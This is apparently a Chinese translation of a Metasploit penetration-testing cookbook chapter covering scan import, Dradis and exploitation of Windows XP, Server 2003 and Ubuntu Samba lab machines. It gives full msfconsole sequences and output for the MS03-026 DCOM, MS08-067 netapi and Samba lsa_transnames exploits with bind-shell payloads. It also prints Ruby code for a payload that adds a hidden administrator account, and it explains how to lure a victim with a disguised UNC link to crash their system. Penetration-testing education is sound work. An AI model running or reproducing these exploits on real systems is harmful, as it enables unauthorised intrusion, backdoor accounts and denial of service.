## 它是如何工作的...

扫描完成后，我们可以使用`msf`控制台的默认数据库命令查看其结果。

让我们看看 NeXpose 产生了什么扫描结果：

```
msf > hosts -c address,os_name,os_flavor
Hosts
=====
address os_name os_flavor
------- ------- ---------
192.168.56.102 Microsoft Windows XP
msf > 
```

## 还有更多...

信息收集完成后，最后一步是导入结果。让我们看看它是如何执行的。

### 导入扫描结果

如果您已经从`msfconsole`使用了 Nessus 和 NeXpose，您可以跳过此信息。

当您使用 Nessus 或 NeXpose 的 GUI 版本时，您将不得不手动将扫描结果导入数据库。我强调导入和存储结果的原因是，在我们的下一章中，我们将看到如何使用`autopwn`命令自动在我们的数据库中运行主机上的利用。因此，为了导入扫描结果，我们将使用`db_import`命令如下：`db_import filename`

```
msf > db_import nexposelist.xml
[*] Importing 'Nexpose XML (v2)' data
[*] Importing host 192.168.56.102
[*] Successfully imported /root/nexposelist.xml 
```

# 与 Dradis 框架共享信息

在我们之前的教程中，我们学习了几种获取有关目标信息的技术。在执行渗透测试时，我们可能需要与其他渗透测试人员共享信息，他们可能位于其他物理位置。在这种情况下，使用 Dradis 框架可以更轻松地共享渗透测试信息。它是一个用于在安全评估期间共享信息的开源框架。它具有几个功能，使其成为一个出色的信息共享工具。其中一些是：

+   通过 SSL 进行通信

+   附件文件和笔记

+   从 Nessus、NeXpose 等导入扫描结果

+   可以扩展以连接外部系统，如漏洞数据库

虽然它不会帮助我们获取有关目标的任何信息，但对于所有安全专业人员来说，该工具在共享渗透测试结果和发现方面非常重要。

## 做好准备

要在 BackTrack 中启动 Dradis 框架，我们需要在终端执行以下命令：

```
root@bt:~# cd /pentest/misc/dradis
root@bt:/pentest/misc/dradis# ./start.sh 
```

成功执行命令后，我们可以通过浏览器启动框架，通过以下地址传递：

`https://127.0.0.1:3004`

我们将被提示设置密码和框架帐户。

![做好准备](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_02_03.jpg)

## 如何做...

让我们开始我们的 Dradis 实验。该框架使我们能够为域和子域地址建立类似树状的结构。这使我们清晰地了解目标结构，并帮助我们以逻辑方式存储信息。它还提供了生成信息完整报告的功能。

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_02_04.jpg)

框架为我们提供了五个重要选项。它们是**添加分支，从文件导入，导出，添加笔记**和**笔记类别**。

一旦您使用您的凭据登录，您将看到一个类似于前面截图中显示的屏幕。您可以在框架的左上角找到五个选项。让我们看看这些选项为我们做了什么。

## 它是如何工作的...

让我们开始创建一个新报告。该过程很简单，从添加主机和子主机开始。

**添加分支**选项使我们能够添加新的 IP 或域名。一旦添加了顶级域，我们可以进一步添加其子域以包括子域。现在下一个任务是添加有关它们的信息。

**添加笔记**选项使我们能够添加我们从各种扫描结果中收集的信息。例如，我们可以添加来自 Nmap、Nessus 等的扫描结果。

**注释类别**选项帮助我们选择用于获取信息的媒介。各种选项包括 Brup 扫描、Nessus 扫描、NeXpose、Nmap 等。您可以选择您用于生成扫描结果的适当选项。

以下截图显示了针对 IP 地址范围 192.168.56.1/24 进行的 Nmap 扫描的信息。左侧的树形结构包含了有关可用目标的信息，右侧的列提供了有关其报告的信息。

![工作原理...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_02_05.jpg)

接下来我们可以用 Dradis 框架做的事情是导入现有报告或导出创建的报告。

**从文件导入**选项为我们提供了灵活性，可以从不同的扫描仪中导入先前的扫描结果。这进一步增强了该框架的功能，因为不同的测试人员可以将结果导入框架并将它们组合成单个报告。

**导出**选项为专业渗透测试人员提供了一个选项，可以将各个域和子域的完整报告生成为单个文件。报告可以以 XML 或 HTML 格式导出。也可以以项目或自定义模板的形式导出。


# 第三章：基于操作系统的漏洞评估和利用

在本章中，我们将涵盖：

+   利用程序使用快速提示

+   对 Windows XP SP2 机器进行渗透测试

+   将 shell 绑定到目标以进行远程访问

+   对 Windows 2003 服务器进行渗透测试

+   Windows 7/Server 2008 R2 SMB 客户端无限循环

+   利用 Linux（Ubuntu）机器

+   理解 Windows DLL 注入漏洞

# 介绍

在上一章中，我们专注于收集有关我们目标的信息。各种信息包括目标 IP 地址、开放端口、可用服务、操作系统等等。在信息收集过程中最重要的资产之一是了解目标服务器或系统使用的操作系统。这些信息在渗透目标机器时可能非常有帮助，因为我们可以快速寻找正在使用的操作系统的利用程序和漏洞。嗯，这个过程并不像听起来那么简单，但了解目标操作系统可以在很大程度上简化我们的任务。

每种操作系统都有一些或其他的漏洞。一旦被报告，就开始开发针对它的利用程序的过程。像 Windows 这样的有许可的操作系统很快就会为漏洞或脆弱性开发补丁，并将其作为更新提供给用户。漏洞披露是一个大问题。许多零日漏洞的披露在计算机行业造成了混乱。零日漏洞非常受欢迎，在地下市场上，价格可能从 50K 美元到 100K 美元不等。漏洞被发现和利用，但漏洞的披露取决于研究人员及其意图。

著名的产品如微软和 Adobe 定期发布补丁，但用户需要自行应用这些补丁。在企业场景中，情况甚至更糟糕——由于停机时间和确保业务连续性不受影响，服务器在被打补丁之前需要花费数周的时间。因此，始终建议更新或关注所使用操作系统中发现的任何最新漏洞。未打补丁的系统对黑客来说是一个安全的避风港，因为他们会立即启动利用程序来攻击目标。因此，定期打补丁和更新操作系统至关重要。在本章中，我们将重点关注一些最受欢迎的操作系统中报告的漏洞。

在渗透测试过程中，一旦获得了有关目标操作系统的信息，渗透测试人员就开始寻找特定操作系统漏洞的可用利用程序。因此，本章将是通过操作系统漏洞渗透我们目标的第一步。我们将重点关注微软和一些 Linux 版本中最广泛使用的家庭和企业操作系统。我们还将讨论如何使用利用程序并设置其参数以使其在目标机器上可执行。最后，但同样重要的是，我们将讨论 Metasploit 框架中对我们可用的一些有用的有效载荷。所以让我们开始做菜。

# 利用程序使用快速提示

在开始在目标机器上使用利用程序和有效载荷之前，我们首先必须了解一些关于它们的基础知识。了解利用程序的使用非常重要，这样您就可以克服由于参数错误配置而可能出现的一些常见错误。因此，让我们从利用程序的基础知识和如何设置参数值开始。

## 做好准备

为了开始在目标上使用利用程序，首先需要扫描目标的开放端口和服务。一旦收集到足够的关于目标的信息，下一步就是相应地选择利用程序。因此，让我们分析一些可以直接从 msfconsole 启动的利用命令。

## 如何做...

以下是在利用程序使用过程中将有所帮助的一些命令：

+   `msf > show exploits`和`msf > show payloads:` 这两个命令将显示 Metasploit 目录中所有可用的攻击和有效载荷。

+   `msf > search exploit:` 此命令将搜索特定的攻击。我们也可以使用此命令搜索任何特定的搜索词。命令应以以下方式传递：

`msf > search exploit-name or search-term`

例如，考虑以下命令：

```
msf > search ms03_026_dcom
Matching Modules
================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
exploit/windows/
dcerpc/ms03_026_dcom 2003-07-16 great Microsoft RPC DCOM 
```

+   `msf > use exploit:` 此命令用于设置任何攻击为活动状态并准备使用。命令以以下方式传递：

msf > use exploit name

执行此命令后，提示符也会更改为攻击类型：

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
msf exploit(ms03_026_dcom) > 
```

+   `show options:` 此命令用于查看正在使用的攻击的可用选项或参数。各种参数包括主机 IP、端口、线程等。标记为`yes`的参数必须有一个值才能执行攻击。

```
msf exploit(ms03_026_dcom) > show options
Module options (exploit/windows/dcerpc/ms03_026_dcom):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 135 yes The target port 
```

+   `set:` 此命令用于在使用的攻击中设置参数的值。它用于为使用的特定攻击设置有效载荷。命令可以以以下方式传递：

`msf > set parameter-name parameter-value`

同样，我们也可以使用`unset`命令：

```
msf exploit(ms03_026_dcom) > set RHOST 102.168.56.102
RHOST => 102.168.56.102
msf exploit(ms03_026_dcom) > 
```

+   还有名为`setg`和`unsetg`的可选命令。当我们需要在`msfconsole`中全局设置参数值时，可以使用这些命令。因此，它可以避免我们重新输入相同的值。

+   `show targets:` 每个攻击都是针对特定目标服务的。此命令显示攻击可以使用的可能目标的信息：

```
msf exploit(ms03_026_dcom) > show targets
Exploit targets:
Id Name
-- ----
0 Windows NT SP3-6a/2000/XP/2003 Universal 
```

在这里，我们可以看到`dcom`攻击适用于多种 Windows 机器。

## 它是如何工作的...

在第一章中，*安全专业人员的 Metasploit 快速提示*，我们已经讨论了整个 Metasploit 框架具有模块化架构。不同的攻击被转换为框架可理解的模块，可以根据其功能。调用不同的命令来加载和设置模块。`msfconsole`的命令行界面使得访问不同的模块和执行渗透测试变得容易。

# 在 Windows XP SP2 机器上进行渗透测试

现在让我们开始使用攻击的世界。首先，我们将使用最基本但最广泛使用的操作系统 Windows XP。在这个示例中，我们将看到如何使用 Metasploit 来入侵我们正在运行 Windows XP 机器的目标系统。我们将使用在上一个示例中学到的命令，然后继续选择攻击和有效载荷，并设置各种所需的参数。

## 准备工作

我们将从`msfconsole`开始我们的渗透测试过程。因此，启动控制台并执行端口扫描以收集有关目标的信息。我们在上一章节中详细讨论了端口扫描。在这里，我假设您已经收集了有关目标的信息，并且它正在运行 Windows XP 操作系统。因此，让我们继续选择攻击和有效载荷。

## 如何做...

要在 Windows XP SP2 机器上执行渗透测试，请按照以下步骤进行：

1.  主要目标是选择一个可以在 Windows XP 机器上使用的攻击。您可以浏览`/exploits/windows`目录，或者简单地搜索 Windows XP 平台上可用攻击的列表。我们将使用 RPC `dcom`漏洞来渗透我们的目标。因此，让我们首先搜索 RPC `dcom`漏洞，使用以下命令：

```
msf exploit(ms03_026_dcom) > search dcom
Matching Modules
================
Name Disclosure Date Rank Description
---- --------------- --- -----------
exploit/windows
dcerpc/ms03_026_dcom 2003-07-16 great Microsoft RPC
xploit/windows/
driver/
broadcom_wifi_ssid 2006-11-11 low Broadcom Wireless
xploit/windows/
smb/ms04_031_netdde 2004-10-12 good Microsoft NetDDE 
```

如我们所见，搜索产生了三个结果。我们将使用第一个攻击，因为它的`rank`列为`great`，因此成功率会更高。

1.  为了将`exploit/windows/dcerpc/ms03_026_dcom`设置为可用的攻击，我们将执行以下命令：

```
msf exploit(ms03_026_dcom) > use exploit/windows/dcerpc/ms03_026_dcom
msf exploit(ms03_026_dcom) > 
```

提示符的更改表示命令已成功执行。

1.  下一步将是设置 exploit 的各种参数。`show options`命令将列出 exploit 中可用的参数。然后，通过使用`set`命令，我们可以设置各种参数。某些参数也将具有默认值：

```
msf exploit(ms03_026_dcom) > show options
Module options (exploit/windows/dcerpc/ms03_026_dcom):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 135 yes The target port
Exploit target:
Id Name
-- ----
0 Windows NT SP3-6a/2000/XP/2003 Universal 
```

这里，`RHOST`表示远程主机的 IP 地址，`RPORT`表示默认绑定端口。`RPORT`的值默认设置为`135`。我们将不得不将`RHOST`的值设置为我们的目标 IP 地址，以执行 exploit：

```
msf exploit(ms03_026_dcom) > set RHOST 192.168.56.102
RHOST => 192.168.56.102
msf exploit(ms03_026_dcom) > 
```

### 注意

请注意，`ms03_026_dcom` exploit 的 ID 设置为`0`。这意味着我们不需要指定目标上运行的 Windows 机器。它可以利用其中列出的任何 Windows 机器。对于任何其他 exploit，我们可能需要使用`show targets`命令选择目标操作系统。

现在，`RHOST`的值已设置为我们的目标 IP 地址。如果我们尝试运行 exploit，我们将收到错误消息。原因是我们尚未为 exploit 选择任何有效载荷。

1.  我们的下一步将是选择相关的有效载荷。我们可以使用`show payloads`命令列出所有可用的有效载荷。我们将从`windows/adduser`有效载荷的简单示例开始。此有效载荷将在目标操作系统中添加一个新用户：

```
msf exploit(ms03_026_dcom) > set PAYLOAD windows/adduser
PAYLOAD => windows/adduser 
```

1.  现在，如果我们再次使用`show options`命令，它将列出 exploit 和 payload 的参数。有效载荷参数将如下所示：

```
Payload options (windows/adduser):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC thread yes seh, thread, process, none
PASS metasploit yes password for this user
USER metasploit yes The username to create 
```

我们可以看到将添加到我们的目标操作系统的默认用户名和密码是`metasploit`和`metasploit`。我们可以使用`set PASS`和`set USER`命令更改这些值。

1.  现在我们的有效载荷已设置好，我们准备渗透目标机器。我们将使用以下命令启动 exploit：

```
msf exploit(ms03_026_dcom) > exploit
[*] Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
[*] Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.56.102[135] ...
[*] Bound to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.56.102[135] ...
[*] Sending exploit ...
[*] Exploit completed, but no session was created. 
```

输出的最后一行显示 exploit 已成功完成在目标机器上。现在将在目标机器中添加一个新用户。输出还表示未创建任何会话。这是因为我们使用的有效载荷是一个简单的`adduser`，不需要任何活动会话。因此，一旦 exploit 完成，与目标的连接就会结束。在下一个步骤中，我们将使用有效载荷设置会话。

## 工作原理...

RPC 的一部分存在漏洞，该漏洞涉及通过 TCP/IP 进行消息交换。失败是因为对畸形消息的处理不正确。这种特定的漏洞影响具有 RPC 的**分布式组件对象模型（DCOM）**接口，该接口监听 RPC 启用的端口。因此，目标机器必须具有运行 RPC 服务的可用端口。

此接口处理由客户机发送到服务器的 DCOM 对象激活请求。成功利用此漏洞的攻击者将能够以受影响系统上的本地系统特权运行代码。攻击者将能够在系统上执行任何操作。这包括安装程序、查看/更改/删除数据或创建具有完全特权的新帐户。

有关此漏洞的更多详细信息，您可以访问以下链接到 Microsoft 安全公告：

[`technet.microsoft.com/en-us/security/bulletin/ms03-026`](http://technet.microsoft.com/en-us/security/bulletin/ms03-026)

现在，为了了解`adduser`有效载荷的工作原理，我们将分析有效载荷的 ruby 代码。让我们浏览到有效载荷位置：

```
root@bt:~# cd /pentest/exploits/framework3/modules/payloads/singles/windows
root@bt:/pentest/exploits/framework3/modules/payloads/singles/windows# less adduser.rb 
```

我们感兴趣的代码部分如下：

```
# Register command execution options
register_options(
[
OptString.new('USER', [ true, "The username to create", "metasploit" ]),
OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
], self.class)
# Hide the CMD option
deregister_options('CMD')
end
#
# Override the exec command string
#
def command_string
user = datastore['USER'] || 'metasploit'
pass = datastore['PASS'] || ''
if(pass.length > 14)
raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
end
return "cmd.exe /c net user #{user} #{pass} /ADD && " +
"net localgroup Administrators #{user} /ADD"
end

```

通过添加`#`符号的注释，您可以理解代码。代码简单且自解释。首先注册用户名和密码的值。然后，它继续隐藏`CMD`函数，以防止在目标屏幕上出现，同时执行有效载荷。然后，代码覆盖`windows/exec`有效载荷以传递参数值并启动一个隐秘的命令提示符在后台执行。

你可以玩弄代码并进行自己的更改。这将帮助你深入了解有效载荷的世界。

# 将一个 shell 绑定到目标以进行远程访问

在上一篇文章中，我们分析了如何利用 Windows SP2 机器并添加一个新用户账户。但是在执行利用后连接立即终止。在这篇文章中，我们将向前迈进一步，将一个 shell 绑定到目标上，以便我们可以建立远程连接并控制目标。这个过程与上一篇文章中提到的类似。我们所要做的就是使用一个不同的有效载荷，可以在目标机器上为我们启动一个 shell。

## 准备工作

我们将再次启动我们的`msfconsole`，我们的目标与*在 Windows XP SP2 机器上进行渗透测试*配方中相同。我们将使用相同的`dcom`漏洞，然后这次使用不同的有效载荷将一个 shell 绑定到目标。

## 如何做...

要将一个 shell 绑定到目标，按照以下步骤进行：

1.  我们将从选择`dcom`利用开始针对我们的目标机器。我们将设置各种利用参数，然后选择有效载荷：

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
msf exploit(ms03_026_dcom) > show options
Module options (exploit/windows/dcerpc/ms03_026_dcom):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 135 yes The target port
Exploit target:
Id Name
-- ----
0 Windows NT SP3-6a/2000/XP/2003 Universal
msf exploit(ms03_026_dcom) > set RHOST 192.168.56.102
RHOST => 192.168.56.102 
```

1.  现在我们的利用已经设置好，我们现在将转向有效载荷。使用`show payloads`命令将列出所有可用的有效载荷。现在，我们将使用`windows/shell/bind_tcp`有效载荷，它将在目标机器上的端口`4444`（默认）上打开一个 TCP 连接，并为我们提供一个命令 shell：

```
msf exploit(ms03_026_dcom) > set PAYLOAD windows/shell/bind_tcp
PAYLOAD => windows/shell/bind_tcp 
```

1.  现在：使用`show options`命令，我们可以设置其他相关参数，如`RHOST`并更改默认端口。设置好参数后，我们将执行利用。让我们看看执行的输出是什么：

```
msf exploit(ms03_026_dcom) > exploit
[*] Started reverse handler on 192.168.56.101:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 2 - lang:English
[*] Selected Target: Windows XP SP2 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (240 bytes) to 192.168.56.102
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:1052) at 2011-10-31 01:55:42 +0530
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32> 
```

利用已经成功执行，并且我们在`msfconsole`中启动了一个命令提示符。现在，这个会话可以用来完全远程访问目标机器。我们可以随时使用`exit`命令退出这个会话。

你现在可能已经意识到了 Metasploit 中有效载荷的强大。强烈建议尝试各种可用的有效载荷，以了解它们的功能。

## 它是如何工作的...

`dcom`利用的工作原理与上一篇文章中解释的相同。要了解`bind_tcp`的工作原理，我们需要等一会儿，因为它涉及到一些我们将在本书的后面章节中处理的概念。不过，你可以通过浏览`/pentest/exploits/framework3/modules/payloads/stagers/windows/bind_tcp.rb`来查看有效载荷 ruby 代码。

## 还有更多...

接下来呢？shell 访问如何为我们提供对目标的控制。

### 获得对目标的完全控制

现在我们已经在目标机器上建立了一个 shell 连接，我们可以通过命令提示符完全访问目标机器。现在我们可以继续使用我们可以使用的常见 DOS 命令来探索目标机器。一些基本操作包括目录列表、复制文件和文件夹、创建用户代理等。

# 对 Windows 2003 服务器进行渗透测试

在上一篇文章中，我们分析了如何使用`dcom`利用来引起缓冲区溢出并利用我们的 Windows 目标。在这篇文章中，我们将专注于一个类似但逻辑上不同的环境。Windows 2003 服务器是微软最广泛使用的企业级操作系统之一。在这篇文章中，我们将看到如何利用 Windows 2003 服务器。更新版本的 Windows 2003 服务器已经修补了`dcom`漏洞，所以在这里不起作用。因此，我们将在这篇文章中尝试不同的漏洞。我们将使用`netapi32.dll`漏洞。首先，我们将分析利用过程，然后分析这个漏洞的原因。让我们开始我们的渗透测试。

## 准备工作

首先，让我们启动`msfconsole`并快速扫描目标。建议您按顺序执行所有步骤，以确保加强基础知识。下一步将与我们在前两个示例中讨论的相同。唯一的区别在于使用利用。

## 如何做...

要对 Windows 2003 服务器进行渗透测试，请按照以下步骤进行：

1.  让我们开始搜索`netapi`。这将列出 Metasploit 目录中与`netapi`相关的任何可用利用：

```
msf > search netapi
Matching Modules
================
Name Disclosure Date Rank
---- --------------- ---- exploit/windows/smb/ms03_049_netapi 2003-11-11 good
exploit/windows/smb/ms06_040_netapi 2006-08-08 good
exploit/windows/smb/ms06_070_wkssvc 2006-11-14 manual
exploit/windows/smb/ms08_067_netapi 2008-10-28 great 
```

正如我们所看到的，四个结果中，最后一个利用具有很高的评分。所以我们将优先使用这个利用。

1.  我们将设置`RHOST`作为我们的目标 Windows 2003 服务器：

```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 445 yes Set the SMB service port
SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
Exploit target:
Id Name
-- ----
0 Automatic Targeting
msf exploit(ms08_067_netapi) > set RHOST 192.168.56.102
RHOST => 192.168.56.102 
```

再次，`Id`值`0`表明我们不需要指定目标操作系统。

1.  一旦我们完成了利用加载过程，下一步将是设置有效载荷。我们将在目标机器上再次设置一个`tcp_bind` shell，就像我们之前讨论的那样。

```
msf exploit(ms08_067_netapi) > set payload
windows/shell/bind_tcp
payload => windows/shell/bind_tcp
msf exploit(ms08_067_netapi) > set LHOST 192.168.56.101
LHOST => 192.168.56.101 
```

所以现在，我们的利用和有效载荷已经准备好了。下一步也是最后一步是使用`exploit`命令。让我们分析执行的结果：

```
msf exploit(ms08_067_netapi) > exploit
[*] Started bind handler
[*] Automatically detecting the target...
[*] Fingerprint: Windows 2003 SERVER - Service Pack 2 - lang:English
[*] Selected Target: Windows 2003 Server SP2 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (240 bytes) to 192.168.56.102
[*] Command shell session 1 opened (192.168.56.101:43408 -> 192.168.56.102:4444) at 2011-11-02 21:25:30 +0530
C:\WINDOWS\system32> 
```

太棒了！我们与目标建立了 shell 连接。这使我们可以通过命令行访问目标机器。您可以看到 Metasploit 在渗透目标机器方面有多么强大。这确实极大地简化了我们的任务。让我们快速看一下我们在这个示例中使用的利用。

## 工作原理...

该模块利用了`netapi32.dll`路径规范化代码中的解析漏洞，通过服务器服务。该模块能够绕过一些操作系统和服务包上的 NX。必须使用正确的目标来防止服务器服务（以及同一进程中的其他几个服务）崩溃。

# Windows 7/Server 2008 R2 SMB 客户端无限循环

对于 Windows 7 和 Windows Server 2008，可用的利用非常少。SMB 客户端无限循环是一种会导致系统崩溃的漏洞。这种漏洞不会提供任何会话或 shell 连接，但值得讨论。我们将在*理解 Windows DLL 注入漏洞*示例中讨论 Windows 7 中的 DLL 注入漏洞。

Microsoft Windows Server 2008 R2 和 Windows 7 中的 SMB 客户端允许远程 SMB 服务器和中间人攻击者通过 SMBv1 或 SMBv2 响应数据包导致拒绝服务（无限循环和系统挂起）。数据包包含 NetBIOS 标头中的不正确长度值或此响应数据包末尾的附加长度字段。这个不正确的标头值是漏洞的主要原因。

## 准备工作

Metasploit 包含一个辅助模块`auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop`，可以用来利用 SMB 服务器并导致拒绝服务。攻击向量通过将 UNC 路径传递到网页并要求用户执行它来工作。一旦用户打开共享文件，系统将完全崩溃，目标将被迫重新启动。

## 如何做...

要开始使用这个辅助模块，我们必须执行`use`命令以及模块的路径。然后，我们将继续设置所需的参数并执行模块。让我们继续实际实施这些步骤：

```
msf > use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop
msf auxiliary(ms10_006_negotiate_response_loop) > show options
Module options (auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop):
Name Current Setting Required Description
---- --------------- -------- -----------
SRVHOST 0.0.0.0 yes The local host..
SRVPORT 445 yes The SMB port to listen
SSL false no Negotiate SSL..
SSLCert no Path to a custom SSL
SSLVersion SSL3 no Specify the version.. 
```

让我们快速设置各种参数。唯一要查找的参数是`SRVHOST`，即本地主机 IP 地址或渗透测试者的 IP 地址。

```
msf auxiliary(ms10_006_negotiate_response_loop) > set SRVHOST 192.168.56.101
SRVHOST => 192.168.56.101 
```

## 工作原理...

我们将使用`run`命令来执行辅助模块。一旦模块执行，它将生成一个共享文件夹链接，必须发送给目标。在这种情况下，生成的链接是`\\192.168.56.101\Shared\Anything`。

```
msf auxiliary(ms10_006_negotiate_response_loop) > run
[*] Starting the malicious SMB service...
[*] To trigger, the vulnerable client should try to access: \\192.168.56.101\Shared\Anything
[*] Server started. 
```

现在我们可以通过制作一个网页并将该链接附加到网页上，然后发送给目标用户，使链接看起来不那么可疑。一旦目标点击该链接，系统将完全冻结，并导致完全的拒绝服务，从而导致系统重新启动。

# 利用 Linux（Ubuntu）机器

Linux 是继 Windows 之后使用最广泛的操作系统之一。在之前的几个示例中，我们看到了如何通过利用可用服务中的关键缺陷来渗透 Windows 机器。在本示例中，我们将处理 Linux 操作系统。我们将在本示例中使用 Ubuntu 9.0，但是对于渗透运行 Samba 服务的任何 Linux 和 Solaris 版本，该过程都是类似的。让我们继续进行本示例。

## 准备工作

我们将从扫描目标 Linux 机器开始，以收集有关可用服务的信息。让我们进行快速的 Nmap 扫描并分析其结果：

```
msf > nmap -sT 192.168.56.101
[*] exec: nmap 192.168.56.101
Starting Nmap 5.20 ( http://nmap.org ) at 2011-11-05 13:35 IST
Warning: Traceroute does not support idle or connect scan, disabling...
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.2.3 ((Ubuntu) PHP/5.2.1)
|_html-title: Index of /
139/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
445/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ) 
```

现在我们已经收集了有关目标的信息。我们的下一步将是选择一个利用和一个适当的有效载荷。

## 如何做...

渗透 Linux 机器的过程与 Windows 的类似。按照以下步骤进行：

1.  我们需要关注的是选择正确的利用和有效载荷。让我们搜索一下 Metasploit 目录中是否有任何 Samba 利用可用：

```
msf > search Samba 
```

1.  该命令将提供 Samba 的各种辅助和利用模块的列表。我们将使用列为良好排名利用的`exploit/linux/samba/lsa_transnames_heap`模块。因此，它将更有可能利用目标。让我们将利用设置为活动状态并设置参数。

```
msf > use exploit/linux/samba/lsa_transnames_heap
msf exploit(lsa_transnames_heap) > show options
Module options (exploit/linux/samba/lsa_transnames_heap):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 445 yes Set the SMB service port
SMBPIPE LSARPC yes The pipe name to use
Exploit target:
Id Name
-- ----
0 Linux vsyscall
msf exploit(lsa_transnames_heap) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(lsa_transnames_heap) > 
```

1.  我们的下一个任务是选择有效载荷。我们必须记住一件事，即我们正在针对 Linux 机器，因此我们必须为渗透过程选择一个 Linux 有效载荷。我们将使用`linux/x86/shell_bind_tcp`有效载荷，它与我们在之前的 Windows 示例中分析的`bind_tcp`有效载荷类似。

```
msf exploit(lsa_transnames_heap) > set payload linux/x86/shell_bind_tcp
payload => linux/x86/shell_bind_tcp
msf exploit(lsa_transnames_heap) > show options
Module options (exploit/linux/samba/lsa_transnames_heap):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST 192.168.56.101 yes The target address
RPORT 445 yes Set the SMB service port
SMBPIPE LSARPC yes The pipe name to use
Payload options (linux/x86/shell_bind_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
LPORT 4444 yes The listen port
RHOST 192.168.56.101 no The target address 
```

1.  我们现在已经准备好了，我们的最后一步将是提供利用命令来开始利用过程：

```
msf exploit(lsa_transnames_heap) > exploit
[*] Started bind handler
[*] Creating nop sled....
[*] Trying to exploit Samba with address 0xffffe410...
[*] Connecting to the SMB service... 
```

成功执行利用后，我们将获得与目标机器的 shell 连接。该过程与我们在之前的示例中讨论的非常相似。唯一的区别在于选择利用和有效载荷。尝试不同的利用和有效载荷组合，将更好地帮助您理解它。

## 它是如何工作的...

让我们快速了解一下服务、其利用和工作的相关内容。Samba 用于 Linux 和 Windows 机器之间的打印和文件共享。该模块触发了 Samba 守护程序的 LSA RPC 服务中的堆溢出。该模块使用了 talloc 块覆盖方法（由 Ramon 和 Adriano 提供），该方法仅适用于 Samba 版本 3.0.21-3.0.24。该利用利用了堆中的动态内存分配。利用可能在第一次尝试时不成功，因此您可以尝试多次以实现成功。

## 还有更多...

让我们再来看一些与 Linux 操作系统相关的更多相关模块。

### Linux 的其他相关利用模块

除了本示例中讨论的利用模块外，还有两个模块值得关注。强烈建议您手动尝试这些利用以深入了解它们。它们是：

+   **Samba chain_reply 内存损坏：**该利用通过破坏 Samba 版本 3.3.13 之前分配给响应数据包的内存来工作。内存通过传递大于目标缓冲区大小的值而崩溃。

+   **Samba trans2open 溢出：**这是 Samba 版本 2.2.0 至 2.2.8 存在的缓冲区溢出漏洞。它通过利用在未设置`noexec`堆栈选项的 x86 Linux 机器上的缺陷来工作。

# 了解 Windows DLL 注入漏洞

在这个示例中，我们将处理一种特殊类型的漏洞，这种漏洞并不直接存在于 Windows 操作系统中。事实上，它存在于运行在 Windows 上的各种应用软件中。这种远程攻击向量涉及影响应用程序如何加载外部库的一类漏洞。我们将对这个问题进行概述，以便进行仔细分析。

## 准备工作

这种攻击向量涉及创建一个脆弱的路径或目录，目标将不得不执行以触发它。该目录可以是文件、提取的存档、USB 驱动器、网络共享等。创建的文件将是完全无害的，但它将执行一个 DLL 注入代码来破坏系统。

## 如何操作...

让我们分析一下 DLL 注入的实际实现。在这个例子中，我们的目标机器是一个未打补丁的 Windows 7 Ultimate 机器。该过程通过创建一个链接来共享文件，目标将不得不访问并执行该文件。随着我们的进展，你将理解这个过程。

1.  我们将使用`exploit/windows/browser/webdav_dll_hijacker`模块作为利用，`windows/meterpreter/bind_tcp`作为有效载荷。让我们快速设置利用和有效载荷以及其他所需的参数：

```
msf > use exploit/windows/browser/webdav_dll_hijacker
msf exploit(webdav_dll_hijacker) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(webdav_dll_hijacker) > show options
Module options (exploit/windows/browser/webdav_dll_hijacker):
Name Current Setting Required Description
---- --------------- -------- -----------
BASENAME policy yes The base name for the listed
EXTENSIONS txt yes The list of extensions
SHARENAME documents yes The name of the top-level
SRVHOST 0.0.0.0 yes The local host...
SRVPORT 80 yes The daemon port to listen
SSLCert no Path to a custom SSL..
URIPATH / yes The URI to use
Payload options (windows/meterpreter/bind_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh..
LPORT 4444 yes The listen port
RHOST 192.168.56.102 no The target address
Exploit target:
Id Name
-- ----
0 Automatic 
```

